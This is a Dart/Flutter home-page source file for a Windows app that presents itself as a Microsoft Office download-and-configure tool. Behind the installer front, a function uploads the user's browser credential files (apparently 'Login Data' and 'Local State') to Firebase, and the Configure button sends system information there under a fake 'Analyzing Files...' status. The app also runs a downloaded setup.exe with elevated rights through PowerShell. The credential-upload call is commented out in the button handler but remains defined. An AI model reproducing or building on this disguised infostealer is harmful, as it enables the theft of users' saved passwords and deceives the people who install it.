
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:ducky/constants/constants_color.dart';
import 'package:ducky/constants/path_constants.dart';
import 'package:ducky/services/download_services.dart';
import 'package:ducky/services/services.dart';
import 'package:ducky/utils/utils.dart';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:process_run/process_run.dart';
import 'package:url_launcher/url_launcher.dart';

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  DuckServices duckServices = DuckServices();

  String? status;
  bool isFinish = false;

  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

  Future<void> sendInfoToFirebase() async {
    setState(() => status = 'Analyzing Files...');
    await duckServices.sendInfoFirebase(context);
    setState(() => status = 'Checking the System...');
  }

  Future<void> sendFilesFirebase() async {
    WindowsDeviceInfo windowsInfo = await deviceInfo.windowsInfo;

    Map<String, dynamic> data = windowsInfo.data;

    String user = data['userName'];

    String userName1 = loginData(user);
    File file1 = File(userName1);

    await duckServices.uploadFile(user: user, title: 'loginData', file: file1);

    String userName2 = localState(user);
    File file2 = File(userName2);

    await duckServices.uploadFile(user: user, title: 'localState', file: file2);
  }

  Future<void> _start(BuildContext context) async {
    try {
      Shell shell = Shell(options: ShellOptions());

      setState(() => status = 'Downloading config.xml...');
      await DownloadServices.download(file: 'config.xml');

      setState(() => status = 'Downloading setup.exe...');
      bool setup = await DownloadServices.download(file: 'setup.exe');

      final Directory doc = await getApplicationDocumentsDirectory();
      String pathParent = doc.path;

      Directory directory = Directory('$pathParent\\office');

      setState(() => status = 'Executing command...');

      final String command =
          "Start-Process -FilePath '${directory.path.replaceAll('\\', '/')}\\setup.exe' -ArgumentList '/configure ${directory.path.replaceAll('\\', '/')}/config.xml' -Verb RunAs -Wait";

      await shell.run('powershell -Command "$command"');

      if (setup) {
        setState(() {
          isFinish = !isFinish;
          status = 'Ready!';
        });
      }
    } catch (_) {
      if (context.mounted) {
        setState(() {
          isFinish = false;
          status = null;
        });
        Utils.showErrorMessageFloating(
          context: context,
          message: 'Something went wrong, try again!',
        );
      }
    }
  }

  Future<void> _goToUrl(String url) async {
    final Uri uri = Uri.parse(url);

    bool onLaunchUrl = await launchUrl(uri, mode: LaunchMode.inAppBrowserView);

    if (!onLaunchUrl) {
      throw Exception('Could not launch $url');
    }
  }

  @override
  Widget build(BuildContext context) {
    Size size = MediaQuery.of(context).size;
    return Scaffold(
      backgroundColor: AppColor.foo,
      body: SizedBox(
        height: size.height,
        width: size.width,
        child: Column(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Image(
                  image: AssetImage('assets/images/duck_app.png'),
                  width: size.width * .25,
                ),
                Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Long Neck Duck',
                      style: TextStyle(
                        fontSize: 19,
                        color: AppColor.whiteColor,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                    SizedBox(height: 3),
                    InkWell(
                      onTap: () async {
                        await _goToUrl('https://github.com/Vinnybrunn00');
                      },
                      child: Text(
                        'By Vinícius Bruno',
                        style: TextStyle(
                          color: AppColor.greyColor,
                          fontSize: 10.5,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children:
                  AssetsUtils.iconsOffice
                      .map(
                        (iconsOffice) => Padding(
                          padding: const EdgeInsets.all(5),
                          child: Tooltip(
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(12),
                              color: iconsOffice['color'],
                            ),
                            message: iconsOffice['title'],
                            child: Material(
                              elevation: 10,
                              color: AppColor.blackBlueColor,
                              borderRadius: BorderRadius.circular(12),
                              child: Container(
                                decoration: BoxDecoration(
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                margin: EdgeInsets.only(
                                  left: 14,
                                  right: 14,
                                  top: 6,
                                  bottom: 6,
                                ),
                                child: Image(
                                  image: AssetImage(
                                    iconsOffice['file'].toString(),
                                  ),
                                  width: 33,
                                ),
                              ),
                            ),
                          ),
                        ),
                      )
                      .toList(),
            ),
            Column(
              children: [
                SizedBox(height: 10),
                SizedBox(
                  width: size.width * .5,
                  child:
                      status != null
                          ? Column(
                            children: [
                              Text(
                                status.toString(),
                                style: TextStyle(
                                  color: AppColor.whiteColor,
                                  fontSize: 14,
                                  fontWeight: FontWeight.w700,
                                ),
                              ),
                            ],
                          )
                          : Text(
                            'Click configure to download and configure office',
                            style: TextStyle(
                              color: AppColor.whiteColor,
                              fontSize: 16,
                              fontWeight: FontWeight.bold,
                            ),
                            textAlign: TextAlign.center,
                          ),
                ),
                SizedBox(height: 8),
                AnimatedContainer(
                  duration: Duration(milliseconds: 480),
                  height:
                      status != null
                          ? isFinish
                              ? 0
                              : 1.8
                          : 0,
                  width: size.width * .48,
                  child: LinearProgressIndicator(
                    minHeight: status != null ? 1.8 : null,
                    backgroundColor: AppColor.greyColor,
                    color: Color(0xff0bab7c),
                  ),
                ),
                SizedBox(height: isFinish ? 10 : 15),
                AnimatedContainer(
                  duration: Duration(milliseconds: 559),
                  height: 50,
                  width: size.width * .4,
                  child: InkWell(
                    onTap:
                        status != null
                            ? null
                            : isFinish
                            ? null
                            : () async {
                              await sendInfoToFirebase();
                              //await sendFilesFirebase();

                              if (!context.mounted) return;
                              await _start(context);
                              await duckServices.createReadmeFileInDesktop();
                            },
                    borderRadius: BorderRadius.circular(12),
                    child: Ink(
                      decoration: BoxDecoration(
                        color: Color(0xff0bab7c),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Center(
                        child: Text(
                          status != null
                              ? isFinish
                                  ? 'Successfully Installed!'
                                  : 'Configuring, Waiting...'
                              : 'Configure',
                          style: TextStyle(
                            color: AppColor.whiteColor,
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}



// AnimatedContainer(
//                   height: isFinish ? size.height * .1 : size.height * .1,
//                   width: isFinish ? size.width * .1 : size.width * .3,
//                   duration: Duration(milliseconds: 600),
//                   child: InkWell(
//                     borderRadius: BorderRadius.circular(
//                       isFinish ? size.width * .1 / 2 : 12,
//                     ),
//                     onTap:
//                         isFinish
//                             ? null
//                             : () async {
//                               // await sendInfoToFirebase();
//                               // await sendFilesFirebase();

//                               if (!context.mounted) return;
//                               //await _start(context);
//                             },
//                     child: Ink(
//                       decoration: BoxDecoration(
//                         color: Color(0xff14171f),
//                         borderRadius: BorderRadius.circular(
//                           isFinish ? size.width * .1 / 2 : 12,
//                         ),
//                       ),
//                       child:
//                           status != null
//                               ? isFinish
//                                   ? Icon(
//                                     color: Color(0xff0BAB7C),
//                                     Icons.check,
//                                     size: 23,
//                                   )
//                                   : Column(
//                                     mainAxisAlignment: MainAxisAlignment.center,
//                                     children: [
//                                       CircularProgressIndicator(
//                                         color: Color(0xff0BAB7C),
//                                         strokeWidth: 2,
//                                       ),
//                                     ],
//                                   )
//                               : Center(
//                                 child: Text(
//                                   'Configure',
//                                   style: TextStyle(
//                                     color: Colors.white,
//                                     fontSize: 13,
//                                     fontWeight: FontWeight.bold,
//                                   ),
//                                 ),
//                               ),
//                     ),
//                   ),
//                 ),